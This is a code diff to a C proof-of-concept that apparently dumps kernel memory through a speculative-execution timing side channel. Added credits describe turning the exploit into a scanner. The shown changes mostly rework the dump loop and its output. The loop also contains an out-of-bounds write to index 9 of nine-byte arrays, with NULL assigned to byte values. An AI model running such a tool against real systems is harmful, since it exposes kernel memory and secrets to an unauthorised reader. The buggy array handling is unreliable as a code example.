@@ -32,6 +32,10 @@
 Alejandro Caceres fork license:
 
 What the dude above said.
+
+Code for (mis)training was written by mniip, Alejandro Caceres and Mark Haase
+from Hyperion Gray were responsible for turning it into a scanner. Please use 
+responsibly.
 */
 
 
@@ -292,70 +296,85 @@ int main(int argc, char *argv[])
 	void *addr;
 	if(argc < 2 || sscanf(argv[1], "%p", &addr) != 1)
 	{
-		fprintf(stderr, "Usage: %s 0xffff????????????\n", argv[0]);
-		exit(EXIT_FAILURE);
+	  fprintf(stderr, "Usage: %s 0xffff????????????\n", argv[0]);
+	  exit(EXIT_FAILURE);
 	}
 
 	channel ch;
 	open_channel(&ch);
 	calculate_cutoff(&ch);
-	printf("cutoff: %d\n", cutoff_time);
+	//dbg printf("cutoff: %d\n", cutoff_time);
 
 	for(int ln = 0; ln < 4096 / 16; ln++)
 	{
-		printf("%p | ", addr + ln * 16);
 
-		unsigned char endianize[16];
-		for(int p = 0; p < 16; p++)
-		{
-		  int val = read_byte(&ch, addr + ln * 16 + p, 1);
-		  if(val < 0) {
-		    printf("cannot read position %d\n", p);
-		  }
-		  else {
-		    endianize[p] = (char)val;
-		  }
-		}
-		
-		unsigned char first_addr[8];
-		unsigned char second_addr[8];
-		int y = 0;
-		for (int x = 15; x >= 0; --x)
-		{
-		  printf("%02x", endianize[x]);
-		  if(x == 8) {
-		    printf(" ");
-		    first_addr[y] = endianize[x];
-		  }
-		  else if (x > 8) {
-		    first_addr[y] = endianize[x];
-		    //printf("%02x", first_addr[x]);
-		  }
+	  if(ln > 3) {
+	    return 0;
+	  }
 
-		  else if (x < 8) {
-		    second_addr[y - 8] = endianize[x];
-		    //printf("%02x", second_addr[x]);
-		  }
+	  //printf("%p | ", addr + ln * 16);
 
-		  else {
-		    //should never be reached
-		    printf("WTF are you doing here???\n");
-		  }
-
-		  y++;
-		  //dbg printf("addrt: ~~ %02x ~~", first_addr[x]);
-		 
-		}
-		
-		for (int c = 0; c < 8; c++) {
-		  printf("----%02x", second_addr[c]);
-		}
-
-		
-
-		printf("\n");
-		memset(&endianize[0], 0, sizeof(endianize));
-		memset(&first_addr[0], 0, sizeof(first_addr));
-		memset(&second_addr[0], 0, sizeof(second_addr));
+	  unsigned char endianize[16];
+	  for(int p = 0; p < 16; p++)
+	    {
+	      //!
+	      int val = read_byte(&ch, addr + ln * 16 + p, 0);
+	      if(val < 0) {
+		printf("cannot read position %d\n", p);
+	      }
+	      else {
+		endianize[p] = (char)val;
+	      }
+	    }
+	  
+	  unsigned char first_addr[9];
+	  unsigned char second_addr[9];
+	  int y = 0;
+	  for (int x = 15; x >= 0; --x)
+	    {
+	      //dbg printf("%02x", endianize[x]);
+	      if(x == 8) {
+		first_addr[y] = endianize[x];
+	      }
+	      else if (x > 8) {
+		first_addr[y] = endianize[x];
+		//printf("%02x", first_addr[x]);
+	      }
+	      
+	      else if (x < 8) {
+		second_addr[y - 8] = endianize[x];
+		//printf("%02x", second_addr[x]);
+	      }
+	      
+	      else {
+		//should never be reached
+		printf("WTF are you doing here???\n");
+	      }
+	      
+	      y++;
+	      //dbg printf("addrt: ~~ %02x ~~", first_addr[x]);
+	      
+	    }
+	  
+	  //are these necessary?
+	  first_addr[9] = NULL;
+	  second_addr[9] = NULL;
+	  
+	  for (int c = 0; c < 8; c++) {
+	    printf("%02x", second_addr[c]);
+	  }
+	  
+	  printf(" ");
+	  
+	  for (int c = 0; c < 8; c++) {
+	    printf("%02x", first_addr[c]);
+	  }
+	  
+	  
+	  printf("\n");
+	  
+	  memset(&endianize[0], 0, sizeof(endianize));
+	  memset(&first_addr[0], 0, sizeof(first_addr));
+	  memset(&second_addr[0], 0, sizeof(second_addr));
 	}
 }
